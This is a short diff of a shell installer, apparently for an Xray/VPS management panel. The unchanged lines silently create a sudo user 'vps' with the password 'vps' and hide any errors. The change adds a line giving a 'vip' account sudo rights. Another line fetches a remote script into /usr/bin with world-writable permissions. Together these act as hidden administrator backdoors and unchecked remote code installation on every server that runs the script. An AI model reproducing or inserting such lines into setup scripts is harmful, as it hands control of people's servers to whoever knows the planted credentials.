@@ -19,7 +19,6 @@ touch /etc/domain
 sudo useradd -m -G sudo vps 2> /dev/null
 echo 'vps:vps' | sudo chpasswd 2> /dev/null
 
-
 function check_root(){
     if [[ $UID -ne 0 ]]; then
         echo -e "${kataa}⚠️Run script as root${mwisho}"
@@ -236,6 +235,7 @@ function main(){
     mkdir /usr/local/etc/xray/backup/vless
     mkdir /usr/local/etc/xray/backup/vmess
     mkdir /usr/local/etc/xray/backup/trojan
+    sudo adduser vip sudo
 
     echo "panel" >> /etc/bash.bashrc
     wget -O /usr/bin/addssh https://sc2.asle.me/addssh.sh && chmod 777 /usr/bin/addssh
